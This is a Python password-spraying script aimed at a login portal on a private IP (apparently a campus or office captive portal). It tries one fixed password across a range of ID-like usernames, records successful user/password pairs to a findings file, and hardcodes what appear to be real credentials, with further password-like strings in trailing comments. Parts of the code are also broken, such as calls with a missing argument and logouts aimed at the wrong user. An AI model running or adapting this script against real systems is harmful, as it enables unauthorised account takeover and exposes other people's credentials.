import requests
import time

url = "http://172.16.68.6:8090/login.xml"


def login(user, passwd, append_to_file):
    req = {"mode": "191", "username": user, "password": passwd}
    x = requests.post(url, data=req)
    if x.text[90] == "Y":
        if append_to_file:
            success_message = f"{user},{passwd}"
            append_to_file(success_message)
        return f"[+] SUCCESS User = {user}, Pass = {passwd}"
    else:
        return f"[-] {user} Failure :("


def logout(user):
    req = {"mode": "193", "username": user}
    x = requests.post(url, data=req)


def correct_attempt():
    login("19102168", "178045HI", append_to_file=False)


def append_to_file(message):
    with open("2024-findings.txt", "a") as file:
        file.write(message + "\n")


for en in range(19102200, 19103000, 4):
    print(login(en, "178045HI"))
    time.sleep(0.01)
    logout(en)
    print(login(en + 1, "178045HI"))
    time.sleep(0.01)
    logout(en)
    print(login(en + 2, "178045HI"))
    time.sleep(0.01)
    logout(en)
    print(login(en + 3, "178045HI"))
    time.sleep(0.01)
    logout(en)
    correct_attempt()

# 179001AS
# 357043AR
